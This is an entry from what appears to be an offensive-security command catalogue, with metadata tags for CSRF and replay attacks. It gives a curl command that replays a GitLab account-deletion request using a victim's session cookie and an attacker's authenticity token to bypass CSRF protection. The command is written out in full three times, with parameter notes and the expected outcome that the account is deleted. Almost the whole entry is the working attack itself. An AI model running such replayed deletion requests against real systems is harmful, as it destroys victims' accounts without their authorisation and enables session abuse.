---
data: >-
  curl -X POST https://localhost:3000/users -H "Cookie:
  _gitlab_session=b9dbae76ceaed44954d57d0d505eca00;" -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
tags:
  - csrf
  - http-post
  - replay-attack
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.406Z'
id: 9a8eeb90-ed1c-47cc-8a64-1e92faf2a442
verified: false
validated: true
submitted: true
---
# curl-replay-deletion-request

## Command

```bash
curl -X POST https://localhost:3000/users -H "Cookie: _gitlab_session=b9dbae76ceaed44954d57d0d505eca00;" -H "Content-Type: application/x-www-form-urlencoded" -d "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

## Description

This curl command replays a modified GitLab deletion request using a victim's session cookie and attacker's token to exploit CSRF bypass on a local instance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-H "Cookie: ..."` | Target session cookie | Yes |
| `-H "Content-Type: ..."` | Form encoding | Yes |
| `-d "..."` | Payload with delete and token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://localhost:3000/users -H "Cookie: _gitlab_session=b9dbae76ceaed44954d57d0d505eca00;" -H "Content-Type: application/x-www-form-urlencoded" -d "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

### Advanced Usage

With full headers:

```bash
curl -X POST https://localhost:3000/users -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:39.0) Gecko/20100101 Firefox/39.0" -H "Accept: text/html,..." -H "Cookie: _gitlab_session=b9dbae76ceaed44954d57d0d505eca00;" -H "Content-Type: application/x-www-form-urlencoded" --data "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

## Expected Output

Successful deletion response (e.g., 302 redirect) or error; in vuln setup, account is deleted without CSRF block.

## Related

- [[commands/curl-modified-deletion-request]]
- [[procedures/Replay-Modified-Request-to-Delete-Account]]
